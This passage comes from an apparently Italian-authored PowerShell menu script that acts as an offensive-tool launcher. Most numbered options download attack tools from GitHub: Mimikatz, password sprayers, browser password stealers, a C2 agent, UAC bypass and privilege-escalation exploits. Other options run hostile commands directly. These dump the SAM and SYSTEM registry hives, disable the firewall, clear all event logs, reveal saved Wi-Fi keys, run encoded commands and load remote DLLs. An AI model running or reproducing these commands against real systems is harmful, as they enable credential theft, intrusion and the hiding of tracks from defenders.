        '39' {Scarica "mdavis332/DomainPasswordSpray/Get-DomainUserList" "Get-DomainUserList.ps1" "mdavis332/DomainPasswordSpray/master/private/Get-DomainUserList.ps1"}
        '40' {write-host "you will get https://github.com/mattifestation/PowerShellArsenal/Disassembly"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "mattifestation/PowerShellArsenal/Disassembly/$FILENAME" "$FILENAME" "mattifestation/PowerShellArsenal/master/Disassembly/$FILENAME"}}
        '41' {write-host "you will get https://github.com/mattifestation/PowerShellArsenal/MemoryTools"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "mattifestation/PowerShellArsenal/MemoryTools/$FILENAME" "$FILENAME" "mattifestation/PowerShellArsenal/master/MemoryTools/$FILENAME"}}
        '42' {write-host "you will get https://github.com/mattifestation/PowerShellArsenal/Misc"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "mattifestation/PowerShellArsenal/Misc/$FILENAME" "$FILENAME" "mattifestation/PowerShellArsenal/master/Misc/$FILENAME"}}
        '43' {write-host "you will get https://github.com/mattifestation/PowerShellArsenal/Parsers"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "mattifestation/PowerShellArsenal/Parsers/$FILENAME" "$FILENAME" "mattifestation/PowerShellArsenal/master/Parsers/$FILENAME"}}
        '44' {write-host "you will get https://github.com/mattifestation/PowerShellArsenal/WindowsInternals"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "mattifestation/PowerShellArsenal/WindowsInternals/$FILENAME" "$FILENAME" "mattifestation/PowerShellArsenal/master/WindowsInternals/$FILENAME"}}
        '45' {write-host "you will get https://github.com/andrew-d/static-binaries/windows/x86"; $FILENAME=read-host 'Digit filename with extension (example nmap.exe)'; if($FILENAME -ne ""){write-host "downloading andrew-d/static-binaries/windows/x86/$FILENAME"; try{invoke-webrequest -uri https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/$FILENAME -outfile $FILENAME}catch{write-host $_}}else{write-host $FILENAME" is not a valid name"}}
        '46' {write-host "you will get https://github.com/andrew-d/static-binaries/windows/x64"; $FILENAME=read-host 'Digit filename with extension (example heartbleeder.exe)'; if($FILENAME -ne ""){write-host "downloading andrew-d/static-binaries/windows/x64/$FILENAME"; try{invoke-webrequest -uri https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x64/$FILENAME -outfile $FILENAME}catch{write-host $_}}else{write-host $FILENAME" is not a valid name"}}
        '47' {ScaricaMul "https://nmap.org/dist/"}
        '48' {Scarica "3gstudent/Homework-of-Powershell/Invoke-DomainPasswordSprayOutsideTheDomain" "Invoke-DomainPasswordSprayOutsideTheDomain.ps1" "3gstudent/Homework-of-Powershell/master/Invoke-DomainPasswordSprayOutsideTheDomain.ps1"}
        '49' {write-host "you will get https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "PowerShellMafia/PowerSploit/Recon/$FILENAME" "$FILENAME" "PowerShellMafia/PowerSploit/master/Recon/$FILENAME"}}
        '50' {Scarica "BloodHoundAD/Ingestors/SharpHound" "SharpHound.ps1" "BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1"}
        '51' {write-host "you will get https://github.com/PyroTek3/PowerShell-AD-Recon"; $FILENAME=read-host 'Digit filename without extension (example exploit)'; if($FILENAME -ne ""){Scarica "PyroTek3/PowerShell-AD-Recon/$FILENAME" "$FILENAME" "PyroTek3/PowerShell-AD-Recon/master/$FILENAME"}}
        '52' {Scarica "vletoux/smbscanner" "smbscanner.ps1" "vletoux/SmbScanner/master/smbscanner.ps1"}
        '53' {Scarica "sperner/PowerShell/Sniffer" "Sniffer.ps1" "sperner/PowerShell/master/Sniffer.ps1"}
        '54' {Scarica "klemmestad/PowerShell/SNMP/MAXFocus_SNMP_Checks" "MAXFocus_SNMP_Checks.ps1" "klemmestad/PowerShell/master/SNMP/MAXFocus_SNMP_Checks.ps1"}
        '55' {write-host "you will get https://github.com/InfosecMatter/Minimalistic-offensive-security-tools"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "InfosecMatter/Minimalistic-offensive-security-tools/$FILENAME" "$FILENAME" "InfosecMatter/Minimalistic-offensive-security-tools/master/$FILENAME"}}
        '56' {Scarica "TsukiCTF/Lovely-Potato/Invoke-LovelyPotato" "Invoke-LovelyPotato.ps1" "TsukiCTF/Lovely-Potato/master/Invoke-LovelyPotato.ps1"}
        '57' {ScaricaSSL "TsukiCTF/Lovely-Potato/JuicyPotato-Static" "JuicyPotato-Static.exe" "TsukiCTF/Lovely-Potato/raw/master/JuicyPotato-Static.exe"}
        '58' {ScaricaSSL "PrateekKumarSingh/AzViz" "AzViz.zip" "PrateekKumarSingh/AzViz/archive/master.zip"}
        '59' {Scarica "mvelazc0/Invoke-SMBLogin" "Invoke-SMBLogin.ps1" "mvelazc0/Invoke-SMBLogin/master/Invoke-SMBLogin.ps1"}
        '60' {write-host "PrintDemon PrivEsc"; Add-PrinterPort -Name C:\Windows\System32\ualapi.dll}
        '61' {Scarica "xtr4nge/FruityC2/agent" "ps_agent.ps1" "xtr4nge/FruityC2/master/agent/ps_agent.ps1"; Scarica "xtr4nge/FruityC2/agent" "ps_proxy.ps1" "xtr4nge/FruityC2/master/agent/ps_proxy.ps1"; Scarica "xtr4nge/FruityC2/agent" "ps_stager.ps1" "xtr4nge/FruityC2/master/agent/ps_stager.ps1"}
        '90' {(dir *.zip).Name; $NOME=read-host "Digit a zip file to extract"; if($NOME -ne "" -and $NOME.EndsWith(".zip")){if(Test-Path $NOME){[System.IO.Compression.ZipFile]::ExtractToDirectory($NOME, $NOME.Replace(".zip", ""))}else{write-host $NOME" does not exist"}}else{write-host "ERROR: empty field or it is not a zip file"}}
        '91' {write-host "Digit first three IPv4 Values dotted"; $IP=read-host "(example, 192.168.168)"; if($IP -ne ""){for ($RANGE = 0; $RANGE -lt 256; $RANGE++){$IPT="$IP.$RANGE"; Write-Host -NoNewLine "`rTest $IPT`r"; try{if((Test-Connection "$IPT" -Quiet -Count 1)){write-host "$IPT found"}}catch{}}}}
        '99' {write-host "Download a file"; write-host "Digit URI/URL and filename with extension"; $FILENAME=read-host "(example http://192.168.1.100/exploit.ps1)"; if($FILENAME -ne ""){write-host "downloading $FILENAME"; try{invoke-webrequest -uri $FILENAME -outfile $FILENAME;}catch{write-host $_}}}
        '100' {write-host "sharing "(Get-Location); net share DataShare=(Get-Location)}
        '101' {$NOME=read-host "Digit a sharing name (example SmbHacked)"; if($NOME -ne ""){write-host "sharing "(Get-Location); New-SmbShare -Path (Get-Location) -Name $NOME}}
        '102' {$User=read-host 'Digit target Domain\\Username'; $Passwd=read-host "Digit target User's password plaintext"; if($User -ne "" -and $Passwd -ne ""){$SecPass = ConvertTo-SecureString $Passwd -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential $User,$SecPass;}}
        '103' {if($Cred -ne $null){write-host "Digit Uri target, optionally with remote port"; $TARGET=read-host "(example, http://localhost:5432)"; if($TARGET -ne ""){try{New-PSSession -Uri $TARGET -Credential $Cred}catch{write-host $_}}else{write-host "Digit a valid Uri"}}else{write-host "PSCredentials are null, please select 102 and create them"}}
        '104' {Scarica "InfosecMatter/SSH-PuTTY-login-bruteforcer" "ssh-putty-brute.ps1" "InfosecMatter/SSH-PuTTY-login-bruteforcer/master/ssh-putty-brute.ps1"}
        '105' {$BASE=read-host "Paste utf16 encoded base64 text"; if($BASE -ne ""){[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($BASE)) | Out-File -FilePath .\filedecoded.txt; write-host "base64 text encoded amd piped to file named filedecoded.txt"}}
        '106' {$BASE=read-host "Paste utf16 encoded base64 text"; if($BASE -ne ""){powershell.exe -EncodedCommand $BASE}}
        '107' {$CMD=read-host "Digit a block of commands"; $COMNAME=read-host "Digit a Computer name"; if($CMD -ne ""){if($COMNAME -ne ""){Invoke-Command -ComputerName $COMNAME -Credential $Cred -ScriptBlock {$CMD}}}}
        '108' {(dir *.psm1).Name; $MODULO=read-host 'Digit a module to import in this path or * for all modules'; if($MODULO -ne ""){try{if($MODULO -eq "*"){Get-ChildItem -Path (Get-Location) -Filter *.psm1 | ForEach-Object -Process { Import-Module $PSItem.FullName}}else{if($MODULO.EndsWith(".psm1")){if(Test-Path $MODULO){Import-Module $MODULO}else{write-host $MODULO" does not exist"}}else{write-host $MODULO" is not a Powershell module"}}}catch{write-host $_}}else{write-host "vuoto"}}
        '109' {write-host "you will get https://github.com/TonyPhipps/Meerkat/tree/master/Modules"; $FILENAME=read-host 'Digit filename with extension (example exploit.psm1)'; if($FILENAME -ne ""){Scarica "TonyPhipps/Meerkat/Modules/$FILENAME" "$FILENAME" "TonyPhipps/Meerkat/master/Modules/$FILENAME"}}
        '110' {cmd.exe /c 'mkdir %SystemDrive%\BypassDir\cscript.exe && copy %windir%\System32\wscript.exe %SystemDrive%\BypassDir\cscript.exe\winword.exe && %SystemDrive%\BypassDir\cscript.exe\winword.exe //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty > winrm-report.txt'}
        '111' {netsh wlan show profiles; write-host "digit a wlan profile name"; $NOME=read-host "profile name: "; cmd.exe /c "netsh wlan show profile $NOME key=clear"}
        '112' {Scarica "HarmJ0y/Misc-PowerShell/Invoke-WdigestDowngrade" "Invoke-WdigestDowngrade.ps1" "HarmJ0y/Misc-PowerShell/master/Invoke-WdigestDowngrade.ps1"}
        '113' {cmd.exe /c reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages" > SecPack.txt}
        '114' {cmd.exe /c 'reg save hklm\sam c:\sam && reg save hklm\system c:\system'}
        '115' {Scarica "EmpireProject/Empire/credentials/Invoke-PowerDump" "Invoke-PowerDump.ps1" "EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1"}
        '116' {write-host "downloading PS-NTDSUTIL"; try{invoke-webrequest -uri https://gallery.technet.microsoft.com/scriptcenter/PS-NTDSUTIL-b7e9e815/file/92879/1/PS-NTDSUTIL.ps1 -outfile PS-NTDSUTIL.ps1.tmp; get-content -path PS-NTDSUTIL.ps1.tmp | set-content -encoding default -path PS-NTDSUTIL.ps1; remove-item -path PS-NTDSUTIL.ps1.tmp}catch{write-host $_}}
        '117' {write-host "downloading Get-MemoryDump"; try{invoke-webrequest -uri https://gallery.technet.microsoft.com/scriptcenter/Get-MemoryDump-c5ab38d8/file/73433/1/Get-MemoryDump.ps1 -outfile Get-MemoryDump.ps1.tmp; get-content -path Get-MemoryDump.ps1.tmp | set-content -encoding default -path Get-MemoryDump.ps1; remove-item -path Get-MemoryDump.ps1.tmp}catch{write-host $_}}
        '118' {Scarica "peewpw/Invoke-WCMDump" "Invoke-WCMDump.ps1" "peewpw/Invoke-WCMDump/master/Invoke-WCMDump.ps1"}
        '119' {Scarica "clymb3r/Invoke-Mimikatz" "Invoke-Mimikatz.ps1" "clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1"}
        '120' {write-host "you will get https://github.com/sperner/PowerShell"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "sperner/PowerShell/$FILENAME" "$FILENAME" "sperner/PowerShell/master/$FILENAME"}}
        '121' {Scarica "kfosaaen/Get-LAPSPasswords" "Get-LAPSPasswords.ps1" "kfosaaen/Get-LAPSPasswords/master/Get-LAPSPasswords.ps1"}
        '122' {Scarica "dafthack/DomainPasswordSpray" "DomainPasswordSpray.ps1" "dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1"}
        '123' {Scarica "NetSPI/PS_MultiCrack" "PS_MultiCrack.ps1" "NetSPI/PS_MultiCrack/master/PS_MultiCrack.ps1"}
        '124' {Scarica "securethelogs/PSBruteZip" "PSBruteZip.ps1" "securethelogs/PSBruteZip/master/PSBruteZip.ps1"}
        '125' {write-host "you will get https://github.com/Kevin-Robertson/Invoke-TheHash"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "Kevin-Robertson/Invoke-TheHash/$FILENAME" "$FILENAME" "Kevin-Robertson/Invoke-TheHash/master/$FILENAME"}}
        '126' {write-host "you will get https://github.com/HarmJ0y/Misc-PowerShell"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "HarmJ0y/Misc-PowerShell/$FILENAME" "$FILENAME" "HarmJ0y/Misc-PowerShell/master/$FILENAME"}}
        '127' {Scarica "PowerShellMafia/PowerSploit/Get-System" "Get-System.ps1" "PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1"}
        '128' {write-host "you will get https://github.com/scipag/PowerShellUtilities"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "scipag/PowerShellUtilities/$FILENAME" "$FILENAME" "scipag/PowerShellUtilities/master/$FILENAME"}}
        '129' {ScaricaSSL "nsacyber/Pass-the-Hash-Guidance" "Pass-the-Hash-Guidance.zip" "nsacyber/Pass-the-Hash-Guidance/archive/master.zip"}
        '130' {Scarica "0xm4v3rick/Extract-Macro" "Extract-Macro.ps1" "0xm4v3rick/Extract-Macro/master/Extract-Macro.ps1"}
        '131' {Scarica "enigma0x3/Generate-Macro" "Generate-Macro.ps1" "enigma0x3/Generate-Macro/master/Generate-Macro.ps1"}
        '132' {ScaricaRel "AlessandroZ/LaZagne"}
        '133' {ScaricaBat "ZecOps/CVE-2020-0796-RCE-POC/calc_target_offsets" "calc_target_offsets.bat" "ZecOps/CVE-2020-0796-RCE-POC/master/calc_target_offsets.bat"}
        '134' {Scarica "nidem/kerberoast/GetUserSPNs" "GetUserSPNs.ps1" "nidem/kerberoast/master/GetUserSPNs.ps1"}
        '135' {$IPT=read-host 'Digit the IP target'; $USRT=read-host 'Digit Domain\User target'; $PASST=read-host 'Digit the password of target User'; if($IPT -ne ""){if($USRT -ne ""){if($PASST -ne ""){Enable-PSRemoting –force; winrm quickconfig -transport:https; Set-Item wsman:\localhost\client\trustedhosts * ; Restart-Service WinRM; winrs -r:$IPT -u:$USRT -p:$PASST cmd}}}}
        '140' {write-host "Ensure lockout threshold < AD lockout"; try{Get-AdfsProperties | fl ExtranetLockoutEnabled,ExtranetLockoutthreshold,ExtranetObservationWindow}catch{write-host $_}}
        '141' {write-host "Set to >1 years"; try{Get-ADFSProperties | Select CertificateDuration; Write-Output "ADFS Server Logging Level:"; (Get-AdfsProperties).LogLevel}catch{write-host $_}}
        '142' {write-host "Check Server Core"; try{$regKey = "hklm:/software/microsoft/windows nt/currentversion"; $SrvCore = (Get-ItemProperty $regKey).InstallationType; if($SrvCore -eq "Server Core"){write-host "Server Core: True"}else{write-host "Server Core: False"}}catch{write-host $_}}
        '143' {Scarica "FuzzySecurity/PowerShell-Suite/Bypass-UAC" "Bypass-UAC.ps1" "FuzzySecurity/PowerShell-Suite/master/Bypass-UAC/Bypass-UAC.ps1"}
        '144' {Scarica "Kevin-Robertson/Inveigh/master/Inveigh-Relay" "Inveigh-Relay.ps1" "Kevin-Robertson/Inveigh/master/Inveigh-Relay.ps1"}
        '145' {Scarica "Nillth/PWSH-LDAP/LDAP-Query" "LDAP-Query.ps1" "Nillth/PWSH-LDAP/master/LDAP-Query.ps1"}
        '146' {write-host "you will get https://github.com/3gstudent/List-RDP-Connections-History"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "3gstudent/List-RDP-Connections-History/$FILENAME" "$FILENAME" "3gstudent/List-RDP-Connections-History/master/$FILENAME"}}
        '147' {ScaricaSSL "dinigalab/ldapsearch" "ldapsearch.exe" "dinigalab/ldapsearch/raw/master/ldapsearch.exe"}
        '148' {ScaricaSSL "NetSPI/PowerUpSQL" "PowerUpSQL.zip" "NetSPI/PowerUpSQL/archive/master.zip"}
        '149' {cmd.exe /c REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300}
        '150' {Scarica "HarmJ0y/ASREPRoast" "ASREPRoast.ps1" "HarmJ0y/ASREPRoast/master/ASREPRoast.ps1"}
        '151' {Scarica "Kevin-Robertson/Tater" "Tater.ps1" "Kevin-Robertson/Tater/master/Tater.ps1"}
        '152' {Scarica "Kevin-Robertson/Powermad" "Powermad.ps1" "Kevin-Robertson/Powermad/master/Powermad.ps1"; Scarica "Kevin-Robertson/Powermad/Invoke-DNSUpdate" "Invoke-DNSUpdate.ps1" "Kevin-Robertson/Powermad/master/Invoke-DNSUpdate.ps1"}
        '153' {Scarica "hausec/PowerZure" "PowerZure.ps1" "hausec/PowerZure/master/PowerZure.ps1"}
        '154' {ScaricaSSL "HarmJ0y/Invoke-Obfuscation" "Invoke-Obfuscation.zip" "HarmJ0y/Invoke-Obfuscation/archive/master.zip"}
        '155' {Scarica "HarmJ0y/WINspect" "WINspect.ps1" "HarmJ0y/WINspect/master/WINspect.ps1"}
        '156' {Scarica "AlsidOfficial/UncoverDCShadow" "UncoverDCShadow.ps1" "AlsidOfficial/UncoverDCShadow/master/UncoverDCShadow.ps1"}
        '157' {ScaricaBat "clr2of8/parse-net-users-bat" "parse-net-users-bat.bat" "clr2of8/fcf9ee60f0e92663dc224e876f1615af/raw/0487659a20588a5b933bcb75b3a3c378affc3e17/parse-net-users-bat.bat"}
        '158' {Scarica "davehardy20/Invoke-WinRMAttack" "Invoke-WinRMAttack.psm1" "davehardy20/Invoke-WinRMAttack/master/Invoke-WinRMAttack.psm1"}
        '159' {Scarica "d1pakda5/PowerShell-for-Pentesters/Code/44/Get-WinRMPassword" "Get-WinRMPassword.ps1" "d1pakda5/PowerShell-for-Pentesters/master/Code/44/Get-WinRMPassword.ps1"}
        '160' {write-host "you will get https://github.com/S3cur3Th1sSh1t/WinPwn"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "S3cur3Th1sSh1t/WinPwn/$FILENAME" "$FILENAME" "S3cur3Th1sSh1t/WinPwn/master/$FILENAME"}}
        '161' {Scarica "Arvanaghi/SessionGopher" "SessionGopher.ps1" "Arvanaghi/SessionGopher/master/SessionGopher.ps1"}
        '162' {ScaricaSSL "giMini/PowerMemory" "PowerMemory.zip" "giMini/PowerMemory/archive/master.zip"}
        '163' {write-host "you will get https://github.com/Kevin-Robertson/Inveigh"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "Kevin-Robertson/Inveigh/$FILENAME" "$FILENAME" "Kevin-Robertson/Inveigh/master/$FILENAME"}}
        '164' {Scarica "hlldz/Invoke-Phant0m" "Invoke-Phant0m.ps1" "hlldz/Invoke-Phant0m/master/Invoke-Phant0m.ps1"}
        '165' {Scarica "leoloobeek/LAPSToolkit" "LAPSToolkit.ps1" "leoloobeek/LAPSToolkit/master/LAPSToolkit.ps1"}
        '166' {Scarica "sense-of-security/ADRecon" "ADRecon.ps1" "sense-of-security/ADRecon/master/ADRecon.ps1"}
        '167' {Scarica "xorrior/RemoteRecon" "RemoteRecon.ps1" "xorrior/RemoteRecon/master/RemoteRecon.ps1"}
        '168' {ScaricaSSL "netbiosX/Digital-Signature-Hijack" "Digital-Signature-Hijack.zip" "netbiosX/Digital-Signature-Hijack/archive/master.zip"}
        '169' {Scarica "deepzec/Win-PortFwd" "win-portfwd.ps1" "deepzec/Win-PortFwd/master/win-portfwd.ps1"}
        '170' {ScaricaExt "sysinternals/ProcessExplorer" "ProcessExplorer.zip" "https://download.sysinternals.com/files/ProcessExplorer.zip"}
        '171' {ScaricaRel "processhacker/processhacker"}
        '172' {ScaricaExt "sysinternals/ProcessMonitor" "ProcessMonitor.zip" "https://download.sysinternals.com/files/ProcessMonitor.zip"}
        '173' {ScaricaExt "sysinternals/Autoruns" "Autoruns.zip" "https://download.sysinternals.com/files/Autoruns.zip"}
        '174' {ScaricaExt "sysinternals/TCPView" "TCPView.zip" "https://download.sysinternals.com/files/TCPView.zip"}
        '175' {write-host "Digit the computername to which clear logs"; $COMNAME=read-host '(empty field or digit localhost for this computer)'; if($COMNAME -ne "" -and $COMNAME -ne "localhost"){$logs = Get-EventLog -ComputerName $COMNAME -List | ForEach-Object {$_.Log}; $logs | ForEach-Object {Clear-EventLog -ComputerName $COMNAME -LogName $_ }}else{$logs = Get-EventLog -List | ForEach-Object {$_.Log}; $logs | ForEach-Object {Clear-EventLog -LogName $_ }}}
        '176' {ScaricaSSL "cyberark/DLLSpy-x64" "DLLSpy.exe" "cyberark/DLLSpy/raw/master/x64/Release/DLLSpy.exe"}
        '177' {ScaricaSSL "rapid7/DLLHijackAuditKit" "DLLHijackAuditKit.zip" "rapid7/DLLHijackAuditKit/archive/master.zip"}
        '178' {ScaricaSSL "nolvis/nolvis-cobol-tool/CobolTool" "CobolTool.exe" "nolvis/nolvis-cobol-tool/raw/master/Ejecutables/CobolTool.exe"}
        '179' {Scarica "FuzzySecurity/PowerShell-Suite/Bypass-UAC" "Bypass-UAC.ps1" "FuzzySecurity/PowerShell-Suite/master/Bypass-UAC/Bypass-UAC.ps1"}
        '180' {write-host "you will get https://github.com/PowerShellMafia/PowerSploit/tree/master/Exfiltration"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "PowerShellMafia/PowerSploit/Exfiltration/$FILENAME" "$FILENAME" "PowerShellMafia/PowerSploit/master/Exfiltration/$FILENAME"}}
        '181' {ScaricaExt "gallery.technet.microsoft.com/scriptcenter/PS2EXE-Convert/PS2EXE" "PS2EXE.zip" "https://gallery.technet.microsoft.com/scriptcenter/PS2EXE-Convert-PowerShell-9e4e07f1/file/134627/1/PS2EXE-v0.5.0.0.zip"}
        '182' {ScaricaExt "gallery.technet.microsoft.com/scriptcenter/POWERSHELL-SCRIPT-TO/MemoryDump_PageFile_ConfigurationExtract" "MemoryDump_PageFile_ConfigurationExtract.zip" "https://gallery.technet.microsoft.com/scriptcenter/POWERSHELL-SCRIPT-TO-5e4a7b57/file/204639/2/MemoryDump_PageFile_ConfigurationExtract.zip"}
        '183' {ScaricaExt "gallery.technet.microsoft.com/scriptcenter/Get-MemoryDump" "Get-MemoryDump.ps1" "https://gallery.technet.microsoft.com/scriptcenter/Get-MemoryDump-c5ab38d8/file/73433/1/Get-MemoryDump.ps1"}
        '184' {Scarica "dafthack/PowerMeta" "PowerMeta.ps1" "dafthack/PowerMeta/master/PowerMeta.ps1"}
        '185' {$COMNAME=read-host 'Digit a Computer name or IP address'; if($Cred -ne $null){RemoteServiceObject = Get-WMIObject -Class Win32_Service -Filter "name='RemoteRegistry'" -Credential $Cred -ComputerName $COMNAME}else{RemoteServiceObject = Get-WMIObject -Class Win32_Service -Filter "name='RemoteRegistry'" -ComputerName COMNAME} if($RemoteServiceObject.State -ne 'Running'){$Null = $RemoteServiceObject.StartService()}}
        '186' {Scarica "Zimm/tcpdump-powershell" "PacketCapture.ps1" "Zimm/tcpdump-powershell/master/PacketCapture.ps1"}
        '187' {Scarica "sperner/PowerShell/Sniffer" "Sniffer.ps1" "sperner/PowerShell/master/Sniffer.ps1"}
        '188' {ScaricaExt "gallery.technet.microsoft.com/scriptcenter/Getting-Windows-Defender/Get-AntiMalwareStatus" "Get-AntiMalwareStatus.ps1" "https://gallery.technet.microsoft.com/scriptcenter/Getting-Windows-Defender-d02fa03e/file/224241/1/Get-AntiMalwareStatus.ps1"}
        '189' {write-host "you will get https://github.com/NetSPI/MicroBurst/Az"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "NetSPI/MicroBurst/Az/$FILENAME" "$FILENAME" "NetSPI/MicroBurst/master/Az/$FILENAME"}}
        '190' {write-host "you will get https://github.com/NetSPI/MicroBurst/tree/master/AzureAD"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "NetSPI/MicroBurst/AzureAD/$FILENAME" "$FILENAME" "NetSPI/MicroBurst/master/AzureAD/$FILENAME"}}
        '191' {write-host "you will get https://github.com/NetSPI/MicroBurst/tree/master/AzureRM"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "NetSPI/MicroBurst/AzureRM/$FILENAME" "$FILENAME" "NetSPI/MicroBurst/master/AzureRM/$FILENAME"}}
        '192' {write-host "you will get https://github.com/NetSPI/MicroBurst/tree/master/MSOL"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "NetSPI/MicroBurst/MSOL/$FILENAME" "$FILENAME" "NetSPI/MicroBurst/master/MSOL/$FILENAME"}}
        '193' {write-host "you will get https://github.com/NetSPI/MicroBurst/tree/master/Misc"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "NetSPI/MicroBurst/Misc/$FILENAME" "$FILENAME" "NetSPI/MicroBurst/master/Misc/$FILENAME"}}
        '194' {write-host "you will get https://github.com/NetSPI/MicroBurst/tree/master/REST"; $FILENAME=read-host 'Digit filename with extension (example exploit.ps1)'; if($FILENAME -ne ""){Scarica "NetSPI/MicroBurst/REST/$FILENAME" "$FILENAME" "NetSPI/MicroBurst/master/REST/$FILENAME"}}
        '195' {cmd.exe /c 'netsh Advfirewall set allprofiles state off && netsh firewall set opmode disable'}
        '196' {net users; $USRNM=read-host 'Digit an username to add at RDP groups'; if($USRNM -ne ""){net localgroup "Remote Desktop Users" $USRNM /add}}
        '197' {Scarica "HackLikeAPornstar/GibsonBird/applocker-bypas-checker" "applocker-bypas-checker.ps1" "HackLikeAPornstar/GibsonBird/master/chapter4/applocker-bypas-checker.ps1"}
        '198' {$DLL=read-host 'Digit a local dll file'; if($DLL -ne ""){rundll32 shell32.dll,Control_RunDLL $DLL}}
        '199' {write-host "Digit a remote ip and dll file"; $DLL=read-host '(example, \\192.168.0.7\folder\test.dll)'; if($DLL -ne ""){rundll32.exe $DLL,0}}
        '200' {ScaricaSSL "danielbohannon/Invoke-Obfuscation" "Invoke-Obfuscation.zip" "danielbohannon/Invoke-Obfuscation/archive/master.zip"}
        '201' {Scarica "chryzsh/JenkinsPasswordSpray" "JenkinsPasswordSpray.ps1" "chryzsh/JenkinsPasswordSpray/master/JenkinsPasswordSpray.ps1"}
        '202' {ScaricaSSL "adnan-alhomssi/chrome-passwords" "chrome-passwords.exe" "adnan-alhomssi/chrome-passwords/raw/master/bin/chrome-passwords.exe"}
        '203' {ScaricaSSL "haris989/Chrome-password-stealer" "Chrome-password-stealer.exe" "haris989/Chrome-password-stealer/raw/master/main.exe"}
        '204' {ScaricaRel "kspearrin/ff-password-exporter"}
        '205' {$FILENAME=read-host 'Digit a file to read'; if($FILENAME -ne ""){if(Test-Path $FILENAME){$MIO = Get-Content -Path $FILENAME -Raw; $MIO -replace '[^\x20-\x7E]', ''}}}
        '206' {Scarica "nullbind/Powershellery/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner" "Invoke-SqlServer-Escalate-Dbowner.psm1" "nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1"}
        '207' {Scarica "dafthack/HostRecon" "HostRecon.ps1" "dafthack/HostRecon/master/HostRecon.ps1"}
        '208' {ScaricaSSL "S3cur3Th1sSh1t/WinPwn" "WinPwn.zip" "S3cur3Th1sSh1t/WinPwn/archive/master.zip"}
        '209' {Scarica "ivan-sincek/file-shredder" "file_shredder.ps1" "ivan-sincek/file-shredder/master/src/file_shredder.ps1"}
        '210' {Scarica "danielwolfmann/Invoke-WordThief" "Invoke-WordThief.ps1" "danielwolfmann/Invoke-WordThief/master/Invoke-WordThief.ps1"}
        '211' {ScaricaExt "sec-1/gp3finder_v4.0" "gp3finder_v4.0.zip" "http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip"}
        '212' {ScaricaSSL "cyberark/SkyArk" "SkyArk.zip" "cyberark/SkyArk/archive/master.zip"}
        '213' {Scarica "FortyNorthSecurity/WMImplant" "WMImplant.ps1" "FortyNorthSecurity/WMImplant/master/WMImplant.ps1"}
        '214' {$FILE=read-host 'Digit a file to shred'; if($FILE -ne ""){if(Test-Path $FILE){Clear-ItemProperty -Path $FILE -Force -Name Attributes;for ($I=0; $I -le 2; $I++){(get-content -path $FILE)|foreach-object{$_ -replace ".", ((32..127)|get-random -count 1|% {[char]$_})}|set-content -path $FILE}(get-content -path $FILE)|foreach-object{$_ -replace ".", "0"}|set-content -path $FILE}}}
        '215' {write-host "Digit a local port to resirect all other local ports"; $PORT=read-host '(example, 4444 or 9050)'; if($PORT -ne ""){netsh interface portproxy add v4tov4 connectport=$PORT connectaddress=127.0.0.1 listenport=* listenaddress=*}}
        '216' {Scarica "danielbohannon/Invoke-CradleCrafter" "Invoke-CradleCrafter.ps1" "danielbohannon/Invoke-CradleCrafter/master/Invoke-CradleCrafter.ps1"; Scarica "danielbohannon/Invoke-CradleCrafter" "Out-Cradle.ps1" "danielbohannon/Invoke-CradleCrafter/master/Out-Cradle.ps1"}
        '217' {Scarica "dafthack/MailSniper" "MailSniper.ps1" "dafthack/MailSniper/master/MailSniper.ps1"}
        '218' {Scarica "fugawi/EASSniper" "EASSniper.ps1" "fugawi/EASSniper/master/EASSniper.ps1"}
        '219' {ScaricaSSL "curi0usJack/luckystrike" "luckystrike.zip" "curi0usJack/luckystrike/archive/master.zip"}
